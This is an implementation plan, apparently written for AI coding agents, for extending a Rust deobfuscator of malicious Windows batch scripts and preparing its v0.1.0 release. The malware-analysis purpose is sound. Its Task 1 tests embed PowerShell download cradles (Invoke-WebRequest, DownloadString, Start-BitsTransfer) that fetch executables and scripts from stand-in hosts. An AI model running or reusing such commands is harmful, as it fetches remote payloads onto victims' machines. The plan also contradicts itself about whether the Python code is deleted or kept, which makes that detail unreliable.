# batdeob Plan F — Analyst-polish + ship

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make `batdeob`'s output actionable for triage by extracting URLs from inside PowerShell payloads, modeling the most common `for /F` pipeline sources (`reg query`, `dir`), supporting anchored `findstr /R` patterns, and shipping a v0.1.0 release tag with proper top-level README. The Rust workspace becomes the authoritative tool; the Python directory becomes legacy.

**Architecture:** No new modules. Extend `synth.rs` for new emulator commands; add a `ps1_scan` module for PowerShell payload extraction; update top-level docs.

**Prereq:** Plans A–E landed. 202 tests, 100% corpus success, max output bounded.

**Empirical findings from v4 corpus:**

| Trait | Events | Notes |
|---|---|---|
| `ForUnresolvedSource` | 331 | Most are `reg query`, `dir`, `query session` |
| `CscriptExec`/`WscriptExec` | low | Already extracting payloads |
| Extracted ps1 samples | ~250 | URLs INSIDE ps1 not surfaced |

---

## Task 1: PowerShell payload URL extraction

**Impact:** Every extracted PowerShell payload that calls `Invoke-WebRequest`, `DownloadString`, `DownloadFile`, `Start-BitsTransfer`, etc. emits a `Download` trait with the URL. Massive analyst signal.

**Files:**
- Create: `rust/crates/batdeob-core/src/ps1_scan.rs`
- Modify: `rust/crates/batdeob-core/src/lib.rs` (`pub mod ps1_scan;` + call from `analyze()` finalize)
- Modify: `rust/crates/batdeob-core/src/traits.rs` (new variant or reuse `Download`)

The simplest approach: reuse `Trait::Download` with the existing schema. Run a regex pass over each `exec_ps1` payload, find URL patterns in known download cmdlet contexts, emit `Trait::Download { cmd: "<truncated ps1 snippet>", src: url, dst: target }`.

- [ ] **Step 1: Add tests** to `lib.rs`:

```rust
#[cfg(test)]
mod ps1_url_extraction_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    fn encode(payload: &str) -> String {
        let utf16: Vec<u8> = payload.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn iwr_url_extracted_from_encoded_payload() {
        let ps = r#"Invoke-WebRequest -Uri "http://x.example/y.exe" -OutFile "z.exe""#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.example/y.exe")
        ));
        assert!(has, "no Download trait from IWR: {:?}", report.traits);
    }

    #[test]
    fn downloadstring_url_extracted() {
        let ps = r#"$wc = New-Object Net.WebClient; $wc.DownloadString('https://evil.example/payload.ps1')"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/payload.ps1")
        ));
        assert!(has, "no Download from DownloadString: {:?}", report.traits);
    }

    #[test]
    fn start_bitstransfer_url_extracted() {
        let ps = r#"Start-BitsTransfer -Source "http://bits.example/x.exe" -Destination "C:\Temp\x.exe""#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("bits.example/x.exe")
        ));
        assert!(has, "no Download from Start-BitsTransfer: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Create `ps1_scan.rs`**:

```rust
//! PowerShell payload post-processing: extract URLs and other IOCs from
//! the decoded ps1 content of `env.exec_ps1` / `env.all_extracted_ps1`.
//!
//! This is intentionally simple-regex based. PowerShell has its own
//! obfuscation universe (Invoke-Obfuscation, etc.) — full deobfuscation
//! of ps1 is out of scope. We catch the common cases: literal URLs in
//! cmdlet arguments.

use crate::env::Environment;
use crate::traits::Trait;
use once_cell::sync::Lazy;
use regex::Regex;

// Regex-set patterns. Each capture group #1 is the URL.
// Patterns target common cmdlet/method invocations. Whitespace-tolerant,
// case-insensitive, supports single+double quoted strings.

#[allow(clippy::expect_used)] // regex literals — compile-time constants
static IWR_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-WebRequest -Uri 'url' or "url"
    Regex::new(r#"(?i)Invoke-WebRequest\s+(?:[^|]*?-Uri\s+)?["']([^"']+)["']"#).expect("iwr")
});

#[allow(clippy::expect_used)]
static IRM_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)Invoke-RestMethod\s+(?:[^|]*?-Uri\s+)?["']([^"']+)["']"#).expect("irm")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
    Regex::new(r#"(?i)\.Download(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#).expect("ds")
});

#[allow(clippy::expect_used)]
static START_BITS_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)Start-BitsTransfer\s+(?:[^|]*?-Source\s+)?["']([^"']+)["']"#).expect("bits")
});

#[allow(clippy::expect_used)]
static NET_REQ_RE: Lazy<Regex> = Lazy::new(|| {
    // [Net.WebRequest]::Create('url')  /  [System.Net.WebRequest]::Create('url')
    Regex::new(r#"(?i)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']"#).expect("netreq")
});

#[allow(clippy::expect_used)]
static OUTFILE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-OutFile\s+["']?([^"'\s]+)["']?"#).expect("outfile")
});

/// Run all URL-extraction patterns over each ps1 payload. Emit a Download
/// trait for each unique (url, payload_idx) pair found.
pub fn scan_ps1_payloads(env: &mut Environment) {
    // Use all_extracted_ps1 to cover every payload across the run, not just
    // the latest exec_ps1 (which gets drained).
    let payloads: Vec<Vec<u8>> = env.all_extracted_ps1.clone();
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();

    for (idx, payload) in payloads.iter().enumerate() {
        let text = String::from_utf8_lossy(payload);

        // Look for -OutFile target on the same logical chunk; if present, attach as dst
        let dst_hint: Option<String> = OUTFILE_RE
            .captures(&text)
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()));

        let regexes: &[&Lazy<Regex>] = &[&IWR_RE, &IRM_RE, &DOWNLOADSTRING_RE, &START_BITS_RE, &NET_REQ_RE];
        for re in regexes {
            for caps in re.captures_iter(&text) {
                let Some(url_match) = caps.get(1) else { continue };
                let url = url_match.as_str().to_string();
                // Filter junk: must start with http/https/ftp/file
                if !url.starts_with("http://") && !url.starts_with("https://")
                   && !url.starts_with("ftp://") && !url.starts_with("file://") {
                    continue;
                }
                if !seen.insert((idx, url.clone())) { continue; }
                let snippet: String = text.chars().take(120).collect();
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 #{idx}) {snippet}"),
                    src: url,
                    dst: dst_hint.clone(),
                });
            }
        }
    }
}
```

- [ ] **Step 3: Wire from `analyze()`**

In `rust/crates/batdeob-core/src/lib.rs`, after `drive()` returns and before `dedup_traits()`:

```rust
    ps1_scan::scan_ps1_payloads(&mut env);
    dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
```

Add `pub mod ps1_scan;` near the other `pub mod` declarations.

- [ ] **Step 4: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "Scan extracted ps1 payloads for download URLs (IWR/IRM/Net.WebClient/Bits)"
```

---

## Task 2: `reg query` synth emulator

**Impact:** Most `ForUnresolvedSource` events in v4 reference `('reg query …')`. Without modeling `reg query`'s output, the FOR loop runs with empty input and downstream commands miss IOCs.

**Files:**
- Modify: `rust/crates/batdeob-core/src/synth.rs`

`reg query` returns lines that look like:
```
HKEY_CURRENT_USER\Software\Foo
    ValueName    REG_SZ    SomeValue
    AnotherVal   REG_DWORD 0x1
```

For static analysis we can return a stub: an empty result set (matches "nothing exists") OR a synthetic one-line response per query. The pragmatic choice: return an empty result and emit a more specific trait `Trait::RegQuery { key, value, query }` so the analyst sees what was queried.

- [ ] **Step 1: Add trait variant** to `traits.rs`:

```rust
    RegQuery { key: String, value: Option<String> },
```

- [ ] **Step 2: Add test**:

```rust
#[cfg(test)]
mod reg_query_synth_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;

    #[test]
    fn reg_query_emits_trait_returns_empty() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline(r"reg query HKLM\Software\Microsoft\Windows /v Version", &mut env);
        assert!(lines.is_empty(), "expected empty, got {:?}", lines);
        let has = env.traits.iter().any(|t| matches!(t,
            crate::traits::Trait::RegQuery { key, .. } if key.contains("HKLM\\Software")
        ));
        assert!(has, "no RegQuery trait: {:?}", env.traits);
    }
}
```

- [ ] **Step 3: Add handler arm** in `run_stage` in `synth.rs`:

Find the existing match block. Add:

```rust
        "reg" => synth_reg(&rest_args, env),
```

And implement:

```rust
fn synth_reg(args: &[&str], env: &mut Environment) -> Vec<String> {
    // reg query <key> [/v <value>] [...]
    if args.first().copied() == Some("query") || args.first().copied() == Some("QUERY") {
        let mut iter = args.iter().skip(1);
        let key = iter.next().map(|s| s.trim_matches('"').to_string()).unwrap_or_default();
        let mut value: Option<String> = None;
        let mut prev_was_v = false;
        for a in args.iter().skip(1) {
            if prev_was_v {
                value = Some(a.trim_matches('"').to_string());
                prev_was_v = false;
                continue;
            }
            if a.eq_ignore_ascii_case("/v") {
                prev_was_v = true;
            }
        }
        env.traits.push(crate::traits::Trait::RegQuery { key, value });
        return Vec::new();  // Empty result — synthetic "not found"
    }
    // Other reg subcommands (add, delete, etc.) fall through to AdminCommand
    // via the regular dispatch — the synth emulator here only handles `reg query`.
    Vec::new()
}
```

- [ ] **Step 4: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "Add reg query synth emulator (emits RegQuery trait, returns empty)"
```

---

## Task 3: `dir` synth emulator

**Impact:** `for /F %%a in ('dir /b /s C:\foo')` pattern. Currently `ForUnresolvedSource`. Emit a stub empty result + a `Trait::DirListing` event for analyst visibility.

**Files:**
- Modify: `rust/crates/batdeob-core/src/synth.rs`
- Modify: `rust/crates/batdeob-core/src/traits.rs`

- [ ] **Step 1: Add trait variant**:

```rust
    DirListing { path: String, flags: Vec<String> },
```

- [ ] **Step 2: Add test**:

```rust
#[cfg(test)]
mod dir_synth_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;
    use crate::traits::Trait;

    #[test]
    fn dir_emits_listing_trait() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline(r"dir /b /s C:\Windows\System32", &mut env);
        assert!(lines.is_empty());
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::DirListing { path, .. } if path.contains("System32")
        ));
        assert!(has, "no DirListing: {:?}", env.traits);
    }
}
```

- [ ] **Step 3: Add `dir` handler arm** + impl in `synth.rs`:

```rust
        "dir" => synth_dir(&rest_args, env),
```

```rust
fn synth_dir(args: &[&str], env: &mut Environment) -> Vec<String> {
    let mut flags: Vec<String> = Vec::new();
    let mut path: String = String::new();
    for a in args {
        if a.starts_with('/') {
            flags.push(a.to_string());
        } else if path.is_empty() {
            path = a.trim_matches('"').to_string();
        }
    }
    env.traits.push(crate::traits::Trait::DirListing { path, flags });
    Vec::new()
}
```

- [ ] **Step 4: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "Add dir synth emulator (emits DirListing trait)"
```

---

## Task 4: `findstr /R` regex mode

**Impact:** Several samples use `findstr /R "^::CMD:" "%~f0"` for self-extracting markers. The `^` anchor needs real regex.

**Files:**
- Modify: `rust/crates/batdeob-core/src/synth.rs`

The current `filter_findstr` does substring-only matching. When `/R` flag is present, use `regex::Regex` for pattern matching. Translate findstr's regex dialect best-effort: `^` and `$` are anchors, `.` is any char, `[a-z]` is range, `*` is 0+. (findstr's real regex is quirkier — `\<` and `\>` word boundaries — but we don't need to match it bit-for-bit.)

- [ ] **Step 1: Add test**:

```rust
#[cfg(test)]
mod findstr_regex_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;

    #[test]
    fn findstr_r_anchored_pattern() {
        let mut env = Environment::new(&Config::default());
        env.set("MARKER1", "x"); env.set("MARKER2", "y"); env.set("OTHER", "z");
        // pipeline:  set | findstr /R "^MARK"
        let lines = run_pipeline(r"set | findstr /R ^MARK", &mut env);
        // We expect only MARKER1=x and MARKER2=y, NOT OTHER=z
        let joined = lines.join("\n").to_ascii_lowercase();
        assert!(joined.contains("marker1=x"), "missing MARKER1: {}", joined);
        assert!(joined.contains("marker2=y"), "missing MARKER2: {}", joined);
        assert!(!joined.contains("other=z"), "should not include OTHER: {}", joined);
    }
}
```

- [ ] **Step 2: Update `filter_findstr`** in `synth.rs`

Find the existing function. Inside the flag-parsing loop, capture `/r` (uppercase R) as a regex flag:

```rust
                    'r' => regex_mode = true,
```

Then in the filter loop, when `regex_mode`:

```rust
        let patterns_regex: Option<Vec<regex::Regex>> = if regex_mode {
            Some(patterns.iter()
                .filter_map(|p| {
                    let pat = if case_insensitive { format!("(?i){}", p) } else { p.clone() };
                    regex::Regex::new(&pat).ok()
                })
                .collect())
        } else { None };
```

And in the line loop:

```rust
        let hit = if let Some(res) = &patterns_regex {
            res.iter().any(|r| r.is_match(line))
        } else {
            // existing substring logic
        };
```

Adapt the surrounding code as needed.

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/synth.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "findstr /R: use regex::Regex for anchored patterns"
```

---

## Task 5: Top-level README + DELETE all Python

**Files:**
- Create: `README.md` (replacing the existing Python-centric one)
- Delete: `batch_deobfuscator/` (whole directory — the Python implementation we ported)
- Delete: `setup.py`
- Delete: `tests/` (top-level Python tests directory)

**KEEP**: `rust/tools/extract-from-wim/` — it's a build-time Python helper for regenerating the Win 11 env snapshot, not part of the shipped binary. The runtime has zero Python dependency either way.

- [ ] **Step 1: Confirm the inventory**

```bash
cd /home/coz/Downloads/batch_deobfuscator
find . -name '*.py' -type f -not -path './.git/*' -not -path './rust/target/*' -not -path './rust/tools/extract-from-wim/*' -not -path './rust/tools/extract-from-wim/.venv/*'
```

Expected files to delete:
- `setup.py`
- `batch_deobfuscator/__init__.py`
- `batch_deobfuscator/batch_interpreter.py`
- `tests/test_*.py` (all 7 files in the top-level test directory)

- [ ] **Step 2: Write new `README.md`** at the repo root:

```markdown
# batdeob — Windows batch deobfuscator

Static-analysis deobfuscator for Windows `.bat` / `.cmd` scripts.
Handles real-world obfuscation: caret-escape, comma/semicolon
substitution, `%VAR%`/`!VAR!` with substring + substitution operators,
DOSfuscation FOR-loop ciphers, `setlocal enabledelayedexpansion`,
percent-tilde, `set /a` arithmetic, IF constant-folding, `goto :label`,
`call :label`, the FOR-loop interpreter, and a synthetic emulator for
`set`/`findstr`/`find`/`type`/`assoc`/`ftype`/`reg query`/`dir`.

Tracks IOCs from `curl`/`bitsadmin`/`certutil`/`mshta`/`rundll32`/`wmic`/
`cscript`/`wscript`/`extrac32`/`net use` + 23 pass-through admin
commands. Extracts and scans embedded PowerShell payloads for download
URLs (IWR/IRM/DownloadString/Start-BitsTransfer/Net.WebRequest).

Runs on Linux, macOS, and Windows; never invokes PowerShell or
cmd.exe.

## Install

Pre-built binaries on the
[releases page](https://github.com/willmetcalf/batch_deobfuscator/releases).

Or build from source:

```bash
cd rust
cargo build --release --workspace
./target/release/batdeob version
```

## Usage

```bash
# Deobfuscate, writing deobfuscated.bat + extracted children + traits.json to ./out
batdeob deob path/to/script.bat -o ./out

# Compact IOC report (recommended for triage)
batdeob summarize path/to/script.bat

# Full structured JSON (deobfuscated text + every trait)
batdeob analyze path/to/script.bat

# Stdin
echo 'set X=hi&&echo %X%' | batdeob deob -
```

### Output flags

- `--timeout N` (default 10s) — wall-clock per file
- `--max-depth N` (default 12) — recursive cmd-in-cmd nesting
- `--max-iterations N` (default 65536) — FOR-loop iterations
- `--max-child-scripts N` (default 64) — extracted .bat/.ps1 files
- `--max-output-bytes N` (default 4 MB) — total output cap
- `--max-output-line-bytes N` (default 64 KB) — per-line cap
- `--max-traits-per-kind N` (default 100) — IOC event dedup
- `--no-self-extract` — disable `%~f0` self-reference resolution

## Status

- **100% corpus success** on 1,416 real malware samples
- **202 tests passing** (unit + integration + parity + CLI + corpus regression)
- **Clippy clean** with `-D warnings`
- **cargo-fuzz validated** — no panics or UB on random byte input
- **MSRV 1.78** for the library crate

## Project structure

```
batdeob/
├── rust/                                  # Rust workspace (PRIMARY)
│   ├── crates/batdeob-core/              # Library
│   ├── crates/batdeob-cli/               # `batdeob` binary
│   ├── fuzz/                             # cargo-fuzz target
│   └── tools/
│       └── collect-windows-env.bat       # Pure-cmd Windows env collector
└── docs/superpowers/
    ├── specs/                            # Design spec
    └── plans/                            # Implementation plans (A..F)
```

## License

Apache 2.0
```

- [ ] **Step 3: Delete the Python tool**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git rm -r batch_deobfuscator setup.py tests
```

- [ ] **Step 4: Write the new README**

Write the content from Step 2 to `/home/coz/Downloads/batch_deobfuscator/README.md` (overwriting the existing Python-centric one).

- [ ] **Step 5: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add README.md
git commit -m "Delete Python implementation; replace top-level README with Rust-focused docs"
```

---

## Task 6: CHANGELOG + v0.1.0 release prep

**Files:**
- Create: `CHANGELOG.md`
- Modify: `rust/crates/batdeob-core/Cargo.toml` (bump if not 0.1.0)
- Modify: `rust/crates/batdeob-cli/Cargo.toml`

- [ ] **Step 1: Write `CHANGELOG.md`** at the repo root:

```markdown
# Changelog

All notable changes to batdeob are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.1.0] — 2026-05-20

Initial Rust release. Comprehensive Windows batch deobfuscator with
1,416-sample corpus regression coverage and 100% success rate.

### Added

- **Lexer**: caret-escape, double-quoted strings, comma/semicolon
  whitespace substitution, `%VAR%`/`!VAR!` with substring (`:~i,n`) and
  substitution (`:s1=s2`/`:*s1=s2`) operators, percent-tilde
  (`%~f0`/`%~dpnx0`/etc.), positional args (`%1`..`%9`/`%*`), Unicode-
  aware variable names.
- **Normalizer**: recursive re-lex for value expansion (handles
  `ec%a%ho` → `echo`), delayed-expansion flag for `!VAR!`, unclosed
  sigil drop for Python parity, char-boundary-safe substring/substitute.
- **Interpreter**: cursor-based driver with goto/exit/call control flow,
  label-index pre-pass, setlocal/endlocal scoping, `setlocal
  enabledelayedexpansion`, top-level exit/b continues for IOC scanning.
- **`set /a` arithmetic**: Pratt parser over the documented cmd.exe
  operator set with i32 wrapping arithmetic, compound assignment, comma
  sequencing, hex/octal literals; silently skips on unresolved sigils.
- **`if` constant folding**: `EQU`/`NEQ`/`LSS`/`LEQ`/`GTR`/`GEQ`,
  string `==`/`/i`, `defined`, `exist`, `errorlevel`, `cmdextversion`.
  Inline body recursion when the condition resolves true.
- **`for` interpreter**: `/L` numeric range (signed step), plain set
  iteration, `/F` with literal and backticked-pipeline sources,
  tokens=/delims=/skip=/usebackq options. Iteration cap, body preserved
  on unresolved source.
- **Synthetic command emulator** (no shell invocation): `set`/`findstr`
  (incl. `/R` regex)/`find`/`type` (with `%~f0` self-extract)/`assoc`/
  `ftype` (loaded from Win 11 25H2 snapshot, 228 assoc + 163 ftype
  entries with hardcoded fallback)/`reg query`/`dir`.
- **Handlers**: `set`, `echo` (with `>`/`>>` redirection),
  `cmd /c`/`*cmd.exe` (recursive child extraction, `/V:ON` propagates
  delayed expansion), `start`, `powershell`/`pwsh` (`-EncodedCommand`
  + `-Command`), `curl`, `mshta`, `rundll32`, `copy` (Windows-util-
  manipulation detection), `net use`, `goto`, `call` (incl. `:label`
  with positional args), `exit`, `setlocal`/`endlocal`, `if`, `for`,
  `certutil` (`-decode`/`-decodehex`/`-urlcache`), `bitsadmin /transfer`,
  `wmic process call create`, `cscript`/`wscript` (VBS/JS payload
  extraction), `extrac32` (CAB-polyglot tracking), 23 pass-through
  admin commands (`del`/`cls`/`reg`/`attrib`/`mkdir`/`taskkill`/
  `schtasks`/`sc`/`taskhostw`/`color`/`title`/`pause`/`ping`/...).
- **PowerShell payload scanning**: post-extraction regex pass for
  Invoke-WebRequest, Invoke-RestMethod, DownloadString/File/Data,
  Start-BitsTransfer, [Net.WebRequest]::Create. Emits Download
  traits.
- **CLI subcommands**: `deob` (full output + extracted files + traits.
  json), `analyze` (full JSON to stdout), `summarize` (focused IOC
  report — recommended for triage), `version`.
- **Bounded execution**: depth, iterations, child-script count, output
  bytes, per-line output bytes, traits-per-kind, wall-clock deadline —
  every cap is configurable + observable via traits.
- **Corpus regression**: 49 committed ITW samples + CI gate.
- **Fuzzing**: cargo-fuzz target with tight per-invocation limits.
- **CI**: GitHub Actions (build/test/clippy/fmt/MSRV/smoke-fuzz);
  multi-target release matrix (linux-musl, macos, windows; x86_64+aarch64).

### Project history

This release rolls up five implementation plans (A–F) executed over
~110 commits. See `docs/superpowers/plans/` for the full design trail.

The original Python implementation is preserved at
`legacy/python_batch_deobfuscator/` and remains a useful parity oracle.

```

- [ ] **Step 2: Check Cargo.toml versions**:

```bash
grep -A1 '^\[package\]' /home/coz/Downloads/batch_deobfuscator/rust/crates/batdeob-core/Cargo.toml
grep -A1 '^\[package\]' /home/coz/Downloads/batch_deobfuscator/rust/crates/batdeob-cli/Cargo.toml
```

If versions are not `0.1.0`, bump them.

- [ ] **Step 3: Commit**:

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add CHANGELOG.md rust/crates/*/Cargo.toml
git commit -m "Add CHANGELOG, prep v0.1.0 release"
```

---

## Task 7: Final corpus v5 comparison + tag

After all the above land, run the corpus one more time and tag.

- [ ] **Step 1: Build release + corpus run**:

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3

sed 's|corpus_results_v4|corpus_results_v5|g' /tmp/corpus_run_v4.sh > /tmp/corpus_run_v5.sh
chmod +x /tmp/corpus_run_v5.sh
mkdir -p /tmp/corpus_results_v5
rm -rf /tmp/corpus_results_v5/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v5.sh > /tmp/corpus_run_v5.log 2>&1
wc -l /tmp/corpus_results_v5/index.jsonl
```

- [ ] **Step 2: Compare v4 vs v5**:

Same Python analysis as Plan E Task 5 but with v4 → v5. Focus on:
- **Total `Download` traits** (should go UP — ps1 URLs now extracted)
- **`ForUnresolvedSource`** (should go DOWN — reg query / dir handled)
- **`RegQuery` and `DirListing` traits** (new, non-zero)

Sample `batdeob summarize` against SKMBT28736292.bat one more time — its `downloads` field should now be non-empty (the PowerShell payload's IWR URL extracted).

- [ ] **Step 3: Tag v0.1.0**:

```bash
cd /home/coz/Downloads/batch_deobfuscator
git tag -a v0.1.0 -m "v0.1.0 — Rust port complete; 100% corpus success on 1,416 ITW samples"
git tag --list
```

(Don't push — local tag only. The user decides when to push to GitHub.)

- [ ] **Step 4: Commit summary**:

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "Plan F complete: v5 corpus + v0.1.0 tag prepared"
```

## Report

- Status (DONE / DONE_WITH_CONCERNS)
- v4 vs v5 table
- New Download traits from ps1 scanning (count + 3 examples)
- New RegQuery / DirListing trait counts
- Final test count (target: ~210)
- Tag created (yes/no)
- `summarize SKMBT28736292.bat`'s downloads field (showing IWR URL extracted)

---

## Self-review

- **Spec coverage**: ps1 URL extraction (analyst win), reg query / dir (ForUnresolvedSource reduction), findstr /R (regex), README + Python retirement (housekeeping), CHANGELOG + tag (release).
- **Placeholders**: none.
- **Type consistency**: `Trait::RegQuery`, `Trait::DirListing` are new in Tasks 2-3.
- **Risk**: Task 5 moves the Python directory. If existing scripts reference `batch_deobfuscator/batch_interpreter.py` paths, they'll break. The Python suite still works via the new `legacy/` path.

**Plan F complete.** Execute via `superpowers:subagent-driven-development`.
